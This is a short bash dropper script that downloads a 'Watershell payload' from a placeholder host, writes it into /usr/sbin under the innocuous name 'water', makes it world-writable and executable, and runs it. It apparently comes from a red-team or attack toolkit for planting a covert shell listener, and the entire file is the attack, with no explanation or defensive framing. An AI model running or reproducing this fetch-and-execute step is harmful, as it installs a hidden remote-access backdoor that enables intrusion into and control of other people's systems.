#!/bin/bash

#Download Watershell payload
wget http://IP/Beachhead_source/watershell-tcp/build/watershell_static_tcp_port_1337 -O /usr/sbin/water
chmod 777 /usr/sbin/water

/usr/sbin/water

